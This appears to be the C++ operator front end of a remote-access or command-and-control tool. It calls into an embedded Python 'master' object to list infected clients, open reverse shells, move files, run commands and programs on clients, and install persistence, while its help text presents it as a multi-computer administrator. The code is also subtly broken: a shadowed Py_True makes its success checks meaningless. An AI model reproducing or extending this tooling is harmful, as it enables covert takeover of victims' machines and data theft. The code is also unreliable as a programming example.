#include "manager.h"
#include "pyhelper.hpp"

manager::manager()
{
    pModule =  PyImport_Import(PyUnicode_FromString("front"));
    master = PyObject_GetAttrString(pModule, "master");
}

bool
manager::FrontListClients()
{
    CPyObject isok= PyObject_CallMethod(master, "displayClients", NULL);
    //https://docs.python.org/3/c-api/bool.html
    CPyObject Py_True;
    if (isok==Py_True){
        cout << "Returned sucessfully" << endl;
        return true;
    }
    else
    {
        cout << "Returned Error!!" << endl;
        return false;
    }
}

bool 
manager::FrontPopShell(int idClient,const char *addr,int port)
{
    CPyObject isok= PyObject_CallMethod(master, "abrirShell", "(isi)",idClient,addr,port);
    CPyObject Py_True;
    if (isok==Py_True){
        cout << "Returned sucessfully" << endl;
        return true;
    }
    else
    {
        cout << "Returned Error!!" << endl;
        return false;
    }
}

void
manager::FrontSendFile(string fname, unsigned idClient = ALL)
{
    PyObject_CallMethod(master, "sendFile", "(si)",fname.c_str(),idClient);
}

void
manager::FrontReciveFile(string fname, unsigned idClient = ALL)
{
    PyObject_CallMethod(master, "downloadFile", "(si)",fname.c_str(),idClient);
}

void
manager::FrontExecProgram(string programName, unsigned idClient = ALL)
{
    PyObject_CallMethod(master, "executeProgram", "(si)",programName.c_str(),idClient);
}

void
manager::FrontInstall(unsigned idClient = ALL)
{
    PyObject_CallMethod(master, "installPersistency", "(i)",idClient);
}

void
manager::runCommand(string cmd,unsigned idClient = ALL)
{
    PyObject_CallMethod(master, "runCommand", "(si)",cmd.c_str(),idClient);
}

void manager::Help()
{
    cout << "FrontListClients list full clients." <<endl << endl;
    cout << "FrontPopShell runs a reverse shell" <<endl << endl;
    cout << "FrontSendFile send a file to the client" <<endl << endl;
    cout << "FrontReciveFile pull file from client" <<endl << endl;
    cout << "FrontExecProgram executable runs on the client machine" <<endl << endl; 
    cout << "FrontInstall Install client application on client" <<endl << endl;
    cout << "The program is an administrator of several computers that act as clients of the server where that program is run" << endl;
    cout << "Command not found." << endl;
}